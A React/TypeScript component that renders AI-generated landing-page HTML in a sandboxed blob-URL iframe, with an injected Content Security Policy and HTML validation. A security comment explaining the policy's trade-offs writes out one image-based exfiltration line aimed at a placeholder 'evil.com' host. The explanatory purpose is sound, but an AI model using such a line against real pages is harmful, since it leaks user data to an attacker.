"use client";

/**
 * Preview Iframe
 * Sandboxed iframe for rendering HTML content
 * Uses blob URL approach to avoid sandbox escape warnings while maintaining functionality
 */

import { useRef, useEffect, useState, useCallback } from "react";
import { cn } from "@/lib/utils";
import { Loader2, AlertCircle } from "lucide-react";
import { logger } from "@/lib/client-logger";

interface PreviewIframeProps {
    html: string;
    deviceMode: "desktop" | "tablet" | "mobile";
    isProcessing: boolean;
    refreshKey?: number;
    onPreviewError?: (error: string) => void;
}

const viewportWidths = {
    desktop: 1280,
    tablet: 768,
    mobile: 375,
};

// Timeout for preview loading (in ms)
const PREVIEW_TIMEOUT = 10000;

export function PreviewIframe({
    html,
    deviceMode,
    isProcessing,
    refreshKey = 0,
    onPreviewError,
}: PreviewIframeProps) {
    const iframeRef = useRef<HTMLIFrameElement>(null);
    const [isLoading, setIsLoading] = useState(true);
    const [previewError, setPreviewError] = useState<string | null>(null);
    const [blobUrl, setBlobUrl] = useState<string | null>(null);
    const timeoutRef = useRef<NodeJS.Timeout | null>(null);
    const previousBlobUrlRef = useRef<string | null>(null);
    const loadingCancelledRef = useRef(false);

    // Validate HTML structure
    const validateHtml = useCallback(
        (htmlContent: string): { valid: boolean; warning?: string; error?: string } => {
            if (!htmlContent || htmlContent.trim().length === 0) {
                return { valid: false, error: "No HTML content to display" };
            }

            // Check for basic HTML structure - these are critical
            const hasHtmlTag = /<html/i.test(htmlContent);
            const hasBodyTag = /<body/i.test(htmlContent);
            const hasClosingHtml = /<\/html>/i.test(htmlContent);
            const hasClosingBody = /<\/body>/i.test(htmlContent);

            if (!hasHtmlTag || !hasBodyTag) {
                return {
                    valid: false,
                    error: "HTML structure is incomplete - missing required tags",
                };
            }

            if (!hasClosingHtml || !hasClosingBody) {
                return {
                    valid: false,
                    error: "HTML structure is incomplete - missing closing tags",
                };
            }

            // Count opening and closing div tags - this is a warning only
            // Simple tag counting can fail on divs in comments, CDATA, or script content
            const openDivCount = (htmlContent.match(/<div/gi) || []).length;
            const closeDivCount = (htmlContent.match(/<\/div>/gi) || []).length;

            if (openDivCount !== closeDivCount) {
                // Log warning but don't block - the browser will handle malformed HTML
                logger.warn(
                    { openDivCount, closeDivCount },
                    "Unbalanced div tags detected (may be false positive)"
                );
                return {
                    valid: true,
                    warning: `Unbalanced div tags (${openDivCount} open, ${closeDivCount} close) - preview may not render correctly`,
                };
            }

            return { valid: true };
        },
        []
    );

    // Create blob URL for iframe content with CSP headers
    useEffect(() => {
        const fullHtml = html || getPlaceholderHtml();

        // Validate HTML before creating blob
        const validation = validateHtml(fullHtml);
        if (!validation.valid && html) {
            // Only show error for user-provided HTML, not placeholder
            setPreviewError(validation.error || "Invalid HTML structure");
            onPreviewError?.(validation.error || "Invalid HTML structure");
            setIsLoading(false);
            return;
        }

        setPreviewError(null);
        setIsLoading(true);
        loadingCancelledRef.current = false;

        // Clean up previous blob URL
        if (previousBlobUrlRef.current) {
            URL.revokeObjectURL(previousBlobUrlRef.current);
        }

        /**
         * Content Security Policy for Preview Iframe
         *
         * IMPLEMENTATION NOTE: CSP is applied via <meta> tag rather than HTTP headers
         * because blob: URLs cannot have HTTP headers attached. The browser creates
         * blob URLs client-side, bypassing any server that could set headers. While
         * <meta> tags can theoretically be overridden by preceding scripts, this is
         * mitigated by our control over the HTML generation (AI-generated, not user-submitted).
         *
         * This CSP provides defense-in-depth against XSS in AI-generated HTML.
         * Trade-offs and limitations:
         *
         * - script-src 'unsafe-inline': Allows inline scripts which is necessary for
         *   AI-generated interactive elements (buttons, forms). This weakens XSS
         *   protection but is required for functionality. The iframe sandbox
         *   provides additional isolation.
         *
         *   SECURITY NOTE: 'unsafe-inline' technically allows data exfiltration via
         *   inline scripts (e.g., new Image().src = 'https://evil.com/?data=' + ...).
         *   However, connect-src 'none' blocks most network methods (fetch, XHR),
         *   and the iframe sandbox restricts top-level navigation. Image-based
         *   exfiltration remains theoretically possible but is mitigated by:
         *   1. AI content is generated by our trusted model, not arbitrary user input
         *   2. Preview runs in sandboxed iframe with limited DOM access
         *   3. Published pages can use stricter CSP if needed
         *
         * - connect-src 'none': Prevents all network requests (fetch, XHR, WebSocket).
         *   This blocks analytics, tracking pixels, and external API calls in preview.
         *   Users who need these features should note they work in production only.
         *
         * - img-src *: Allows images from any source to support user-uploaded content
         *   and external image URLs in landing pages. Consider restricting to specific
         *   domains (e.g., our Supabase storage) for production pages if exfiltration
         *   risk is a concern.
         *
         * NOTE: These restrictions are for preview only. Published pages can be
         * configured with different CSP based on business requirements.
         */
        const cspMeta = `<meta http-equiv="Content-Security-Policy" content="default-src 'self' data: blob:; script-src 'unsafe-inline'; style-src 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src * data: blob:; connect-src 'none'; frame-ancestors 'none';">`;
        const htmlWithCsp = fullHtml.replace(/<head[^>]*>/i, `$&\n    ${cspMeta}`);

        // Create new blob URL with CSP-protected HTML
        const blob = new Blob([htmlWithCsp], { type: "text/html" });
        const newBlobUrl = URL.createObjectURL(blob);
        setBlobUrl(newBlobUrl);
        previousBlobUrlRef.current = newBlobUrl;

        // Set timeout for loading
        if (timeoutRef.current) {
            clearTimeout(timeoutRef.current);
        }
        timeoutRef.current = setTimeout(() => {
            if (!loadingCancelledRef.current) {
                logger.warn(
                    { html: html?.substring(0, 200) },
                    "Preview loading timeout"
                );
                setPreviewError(
                    "Preview is taking too long to load. The HTML may have issues."
                );
                setIsLoading(false);
            }
        }, PREVIEW_TIMEOUT);

        return () => {
            loadingCancelledRef.current = true;
            if (timeoutRef.current) {
                clearTimeout(timeoutRef.current);
            }
        };
    }, [html, refreshKey, validateHtml, onPreviewError]);

    // Clean up blob URL on unmount
    useEffect(() => {
        return () => {
            if (previousBlobUrlRef.current) {
                URL.revokeObjectURL(previousBlobUrlRef.current);
            }
        };
    }, []);

    // Handle iframe load
    const handleLoad = useCallback(() => {
        if (timeoutRef.current) {
            clearTimeout(timeoutRef.current);
        }
        setIsLoading(false);
        setPreviewError(null);
    }, []);

    // Handle iframe error
    const handleError = useCallback(() => {
        if (timeoutRef.current) {
            clearTimeout(timeoutRef.current);
        }
        setIsLoading(false);
        setPreviewError("Failed to load preview");
        onPreviewError?.("Failed to load preview");
    }, [onPreviewError]);

    const width = viewportWidths[deviceMode];

    return (
        <div className="relative h-full w-full">
            {/* Loading Overlay */}
            {(isLoading || isProcessing) && !previewError && (
                <div className="absolute inset-0 z-10 flex items-center justify-center bg-background/50 backdrop-blur-sm">
                    <div className="flex items-center gap-2 text-muted-foreground">
                        <Loader2 className="h-5 w-5 animate-spin" />
                        <span className="text-sm">
                            {isProcessing
                                ? "Applying changes..."
                                : "Loading preview..."}
                        </span>
                    </div>
                </div>
            )}

            {/* Error Overlay */}
            {previewError && (
                <div className="absolute inset-0 z-10 flex items-center justify-center bg-background/80">
                    <div className="max-w-md rounded-lg border border-destructive/20 bg-destructive/5 p-6 text-center">
                        <AlertCircle className="mx-auto mb-3 h-8 w-8 text-destructive" />
                        <h3 className="mb-2 font-semibold text-destructive">
                            Preview Error
                        </h3>
                        <p className="text-sm text-muted-foreground">{previewError}</p>
                        <p className="mt-3 text-xs text-muted-foreground">
                            Ask the AI to fix this issue in the chat.
                        </p>
                    </div>
                </div>
            )}

            {/* Iframe - Using blob URL to avoid sandbox escape warning */}
            <iframe
                ref={iframeRef}
                title="Page Preview"
                src={blobUrl || "about:blank"}
                sandbox="allow-scripts"
                onLoad={handleLoad}
                onError={handleError}
                className={cn("border-0 bg-white", "transition-all duration-300")}
                style={{
                    width: deviceMode === "desktop" ? "100%" : `${width}px`,
                    height: "100%",
                    minHeight: deviceMode === "desktop" ? "600px" : "auto",
                    display: "block",
                }}
            />
        </div>
    );
}

// Placeholder HTML when no content is provided
function getPlaceholderHtml(): string {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Preview</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .placeholder {
      text-align: center;
      padding: 2rem;
    }
    .placeholder-icon {
      font-size: 4rem;
      margin-bottom: 1rem;
    }
    h1 {
      font-size: 1.5rem;
      color: #1f2937;
      margin-bottom: 0.5rem;
    }
    p {
      color: #6b7280;
      max-width: 400px;
    }
  </style>
</head>
<body>
  <div class="placeholder">
    <div class="placeholder-icon">🎨</div>
    <h1>Ready to Create</h1>
    <p>Generate your landing page to see the preview here. Your AI-powered page will appear in real-time as you make edits.</p>
  </div>
</body>
</html>
  `.trim();
}
